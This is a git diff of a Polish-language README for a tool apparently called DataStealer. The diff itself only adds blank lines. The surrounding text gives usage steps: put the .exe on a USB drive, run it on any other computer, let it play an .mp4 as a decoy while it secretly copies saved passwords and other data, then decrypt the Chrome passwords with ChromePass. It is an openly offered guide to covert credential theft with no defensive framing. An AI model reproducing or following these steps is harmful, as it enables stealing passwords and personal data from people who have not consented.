@@ -15,6 +15,7 @@ teraz pobrany porgram .exe umiesc na pendrivie ale nie w folderze Hidden
 tylko na pendrive 
 
 Powinno to wyglądać tak:
+
 ![image](https://github.com/Gacel0l/DataStealer/assets/79628437/cef81129-7fed-466a-9b27-7d3402fba677)
 ![image](https://github.com/Gacel0l/DataStealer/assets/79628437/0a261b52-a2f5-4dbe-8e75-56cb75523334)
 ![image](https://github.com/Gacel0l/DataStealer/assets/79628437/074b576f-4f4a-4cf0-9ad6-12a4baa59139)
@@ -22,12 +23,14 @@ Powinno to wyglądać tak:
 Teraz możesz iść na dowolny inny komputer podłączyć pendrive odpalic plik .exe on automatycznie odpali plik .mp4
 aby wyglądało to legitnie i w tle skopiuje ważne hasła i inne dane do folderu Data 
 Dane Które Zbierze Program Powinny wyglądać tak:
+
 ![image](https://github.com/Gacel0l/DataStealer/assets/79628437/cbc9c1e2-53bd-4471-a2e9-67fbbf9a59da)
 
 Te dane z hasłami można następnie rozszyfrować i zobaczyć ich zawartość np programem ChromePass 
 w programie ChromePass mozna zmienić lokacje pliku do odszyfrowanie nalezy ją zmienić na lokacje folderu z przeglądarką
 istnieją też rożne inne programy do odszyfrowywania haseł tego samego autora lub innych odszyfrowane hasła googleChrome
 powinny wyglądać +- tak:
+
 ![image](https://github.com/Gacel0l/DataStealer/assets/79628437/a1f2ffec-034b-405a-85df-09fc9036618d)
 
 
